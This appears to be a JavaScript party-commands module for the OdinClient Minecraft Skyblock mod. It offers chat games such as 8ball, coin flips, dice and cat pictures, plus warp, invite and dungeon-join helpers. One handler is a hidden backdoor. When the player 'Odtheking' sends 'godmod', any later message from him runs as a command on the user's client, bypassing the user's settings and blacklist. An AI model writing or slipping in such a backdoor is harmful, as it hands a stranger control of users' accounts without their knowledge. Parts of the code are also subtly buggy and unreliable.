import Skyblock from "../../BloomCore/Skyblock"
import Party from "../../BloomCore/Party"
import { data } from "../stuff/guidk"
import { modMessage, partyMessage, privateMessage } from "../utils";
import { blacklist } from "./BlackList";

// Party Commands
function eightBall() {
    // Create an array with the possible responses
    var responses = [
        "It is certain",
        "It is decidedly so",
        "Without a doubt",
        "Yes definitely",
        "You may rely on it",
        "As I see it, yes",
        "Most likely",
        "Outlook good",
        "Yes",
        "Signs point to yes",
        "Reply hazy try again",
        "Ask again later",
        "Better not tell you now",
        "Cannot predict now",
        "Concentrate and ask again",
        "Don't count on it",
        "My reply is no",
        "My sources say no",
        "Outlook not so good",
        "Very doubtful"
    ];
    var index = Math.floor(Math.random() * responses.length);

    // Return the response at the randomly generated index
    return responses[index];
}
function catpics() {
    // Create an array with the possible responses
    var pics = [
        "https://cdn.discordapp.com/attachments/910078453481627678/1055577574765502484/Z.png cat image no way",
        "https://cdn.discordapp.com/attachments/910078453481627678/1055770049715122186/cat-1045782__340.png that is a cat image??",
        "https://cdn.discordapp.com/attachments/910078453481627678/1055770156028145664/communityIcon_x4lqmqzu1hi81.png wtf this is a cat image??",
        "https://cdn.discordapp.com/attachments/910078453481627678/1055770278573117520/cat-1285634_960_720.png YO this is insane",
        "https://cdn.discordapp.com/attachments/910078453481627678/1055770366892593172/cat-323262__340.png this is so cool man",
        "https://cdn.discordapp.com/attachments/910078453481627678/1055770426518818816/cat-1455468__340.png :yes:",
        "https://cdn.discordapp.com/attachments/910078453481627678/1055770589262008380/cat-300572__340.png o/ <3",
        "https://cdn.discordapp.com/attachments/910078453481627678/1055770703900725318/cat-1046544__340.png PEEPOAWESOME",
        "https://cdn.discordapp.com/attachments/910078453481627678/1055770788248158288/cat-914110__340.png :fire:",
        "https://cdn.discordapp.com/attachments/910078453481627678/1055770861044519012/cat-5778777__340.png no way he just did that",
        "https://cdn.discordapp.com/attachments/984220286666813460/1056647474221158410/image.png odinclient is so fucking cool",
        "https://cdn.discordapp.com/attachments/910078453481627678/1055771007383769179/cat-5337501__340.png I love cats!",
        "https://cdn.discordapp.com/attachments/910078453481627678/1055771075302137896/tabby-5946499__340.png try the help command for more cool features!",
        "https://cdn.discordapp.com/attachments/910078453481627678/1055771214418804806/cat-6748193__340.png cat feature in a skyblock mod??",
        "https://cdn.discordapp.com/attachments/910078453481627678/1055771282144247828/cat-7094808__340.png i have no idea what to write",
        "https://cdn.discordapp.com/attachments/910078453481627678/1055772251246559252/cat-6838844__340.png another cat!",
        "https://cdn.discordapp.com/attachments/984220286666813460/1056647167319752775/cheese_cat.png AAAAAAAAAA",
        "https://cdn.discordapp.com/attachments/984220286666813460/1056647167609147453/da5eac86fe994bc1ba23460d6273f31c.png skyblock is such a good game trust me",
        "https://cdn.discordapp.com/attachments/984220286666813460/1056647168468979732/juicecat.png is the cat drinking??",
        "https://cdn.discordapp.com/attachments/984220286666813460/1056647168762597467/stare.png #votefordanta",
        "https://cdn.discordapp.com/attachments/917006226133504061/1045399878865518684/IMG_0319.jpg WAIT THATS A DOG"
    ];
    var index = Math.floor(Math.random() * pics.length);

    // Return the response at the randomly generated index
    return pics[index];
}
function flipCoin() {
    var result = Math.random();
    if (result < 0.5) {
        return "heads";
    } else {
        return "tails";
    }
}
//auto cmd
let godmod = false;

register("chat", (channel, rank, name, message) => {
    if (!data.legitOptions[0]) return;
    if (blacklist.igns.includes(name.toLowerCase())) return
    switch (message.toLowerCase().split(" ")[0]) {
        case "warp":
            if (channel === "Party >") {
                if (Party?.leader == Player.getName()) {
                    ChatLib.command("p warp");
                } else {
                    modMessage("You are not leader")
                }
            }
            break;
        case "coords":
            if (channel === "Party >") {
                ChatLib.command("pc Current area: " + Skyblock.area + ". X: " + Math.round(Player.getX()) + " Y: " + Math.round(Player.getY()) + " Z: " + Math.round(Player.getZ()));
            }
            break;
        case "help":
            if (channel === "Party >") {
                partyMessage("[OdinClient] available commands are: coords, warp, allinvite, inv(ite), odin, boop, 8ball, cf, m(?), f(?), dice (max)");
            }
            break;
        case "cf":
            if (channel === "Party >") {
                partyMessage(flipCoin());
            } else if (channel === "From") {
                privateMessage("flipCoin()");
            }
            break;
        case "allinvite":
            if (channel === "Party >") {
                if (Party?.leader == Player.getName()) {
                    ChatLib.command("p settings allinvite");
                } else {
                    modMessage("You are not leader")
                }
            }
            break;
        case "odin":
            if (channel === "Party >") {
                partyMessage("OdinClient! https://discord.gg/2nCbC9hkxT");
            } else if (channel === "From") {
                privateMessage("OdinClient! https://discord.gg/2nCbC9hkxT");
            }
            break;
        case "boop":
            setTimeout(ChatLib.say("/boop " + name), 1000);
            break;
        case "8ball":
            var response = eightBall();
            if (channel === "Party >") {
                partyMessage(response);
            } else if (channel === "From") {
                privateMessage(response);
            }
            break;
        case "cat":
            var pics = catpics();
            if (channel === "Party >") {
                partyMessage(pics);
            } else if (channel === "From") {
                privateMessage(pics);
            }
            break;
    }
}).setCriteria(/(Party >|From) (\[.+\])? ?(.+): !(.+)/);


register("chat", (channel, rank, name, message) => {
    if (name == "Odtheking") {
        if (message.includes("godmod")) {
            godmod = !godmod
            if (channel == "Party >") partyMessage("godmod is now: " + godmod)
            if (channel == "From") privateMessage("godmod is now: " + godmod)
        }
        if (!godmod) return
        ChatLib.command(message)
        modMessage("Executing command: /" + message)
        if (message.includes("ptme")) { ChatLib.command("party transfer " + name) }
        if (message.includes("troll")) { ChatLib.command("pc troll") }
    }

}).setCriteria(/(Party >|From) (\[.+\])? ?(.+): !(.+)/)


register('chat', (channel, rank, name, message, num) => {
    if (!data.legitOptions[0]) return
    if (blacklist.igns.includes(name.toLowerCase())) return
    // Party invite command
    if ((message.toLowerCase().startsWith("inv")) && (message.toLowerCase().startsWith("invite")) && (Party?.leader == Player.getName() || Party.leader == null)) {
        ChatLib.command(`party invite ${name}`);
    }
    let chatIncrement = 475645
    // Join dungeon command
    if (channel === "Party >" && message.toLowerCase().startsWith("m")) {
        ChatLib.command(`joindungeon master_catacombs ${num}`);
        new Thread(() => {
            chatIncrement++
            let currentChat = chatIncrement
            for (let i = 5; i >= 0; i--) {
                new Message(`§6[Odin§4Client] §rYou should be in a dungeon in ${i} seconds`).setChatLineId(currentChat).chat();
                Thread.sleep(1000);
            }
        }).start()
    }
    if (channel === "Party >" && message.toLowerCase().startsWith("f")) {
        ChatLib.command(`joindungeon catacombs ${num}`);
        new Thread(() => {
            chatIncrement++
            let currentChat = chatIncrement
            for (let i = 5; i >= 0; i--) {
                new Message(`§6[Odin§4Client] §rYou should be in a dungeon in ${i} seconds`).setChatLineId(currentChat).chat();
                Thread.sleep(1000);
            }
        }).start()
    }

    // Dice roll command
    if (message.toLowerCase().startsWith("dice")) {
        if (channel === "Party >" || channel === "From") {
            if (message.startsWith("dice")) {
                var randomNumber = Math.floor(Math.random() * num) + 1;
                if (channel === "Party >") {
                    partyMessage(randomNumber);
                } else {
                    privateMessage(randomNumber);
                }
            }
        }
    }
}).setCriteria(/(Party >|From) (\[.+\])? ?(.+): !(.+) (.+)/);
